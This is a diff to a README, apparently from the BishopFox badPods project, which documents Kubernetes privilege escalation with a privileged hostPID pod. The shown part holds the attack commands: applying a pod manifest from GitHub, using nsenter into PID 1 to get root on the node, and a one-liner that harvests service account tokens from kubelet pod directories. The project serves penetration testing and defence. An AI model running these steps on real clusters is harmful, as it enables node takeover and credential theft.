@@ -7,9 +7,9 @@ If you have `privileged=true` and `hostPID` available to you, you can use the `n
 ### Create a pod
 ```bash
 # Option 1: Create pod from local yaml 
-kubectl apply -f pod-priv-and-hostpid.yaml [-n namespace] 
+kubectl apply -f pod-priv-and-hostpid.yaml  
 # Option 2: Create pod from github hosted yaml
-kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml [-n namespace] 
+kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/pod-priv-and-hostpid.yaml  
 ```
 
 ### Exec into pod 
@@ -23,7 +23,7 @@ kubectl -n [namespace] exec -it pod-priv-and-hostpid -- bash
 nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # You now have full root access to the node
 
-# Example privesc path: Hunt for tokens in /host/var/lib/kubelet/pods/
+# Example privesc path: Hunt for tokens in /var/lib/kubelet/pods/
 tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort
 
 default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
